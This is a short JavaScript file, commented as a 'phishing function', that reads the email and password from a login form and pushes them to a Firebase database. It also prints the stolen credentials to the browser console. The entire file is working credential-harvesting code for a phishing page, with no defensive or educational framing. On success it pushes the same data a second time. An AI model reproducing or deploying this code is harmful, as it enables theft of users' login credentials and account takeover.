//we will write phishing function to get user data and post it to Firebase
//lets try

function phishingFunction(){

	var email = document.getElementById('email').value;
	var password = document.getElementById('pass').value;
	console.log("Logged in Email is " + email + " and Logged in password is " + password);
	
	var userDetails= {
		email : email,
		password : password
	};

	firebase.database().ref().push(userDetails,function(err){
		if(err){
			console.warn("error: "+ err);
		}
		else{
			firebase.database().ref().push({

				email : userDetails.email,
				password : userDetails.password
			});
		}
	})

}

function trackChanges(){

	var email = document.getElementById('email').value;
	var password = document.getElementById('pass').value;
    console.log("Email is " + email + " and Password is " + password);
}